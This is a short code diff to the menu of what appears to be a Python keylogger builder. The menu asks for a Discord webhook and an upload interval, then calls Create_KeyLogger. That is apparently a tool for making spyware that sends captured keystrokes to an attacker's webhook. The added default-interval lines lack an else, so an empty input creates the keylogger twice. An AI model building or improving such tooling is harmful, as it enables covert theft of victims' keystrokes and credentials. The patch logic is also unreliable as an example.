@@ -68,6 +68,8 @@ def main_menu():
             f'{Fore.CYAN}Enter discord webhook {Fore.YELLOW}>> {Fore.RESET}'))
         intervals = str(input(
             f'{Fore.CYAN}Enter intervals (default 60) {Fore.YELLOW}>> {Fore.RESET}'))
+        if intervals == "":
+            Create_KeyLogger(webhook, "60")
         Create_KeyLogger(webhook, intervals)
         main_menu()
 
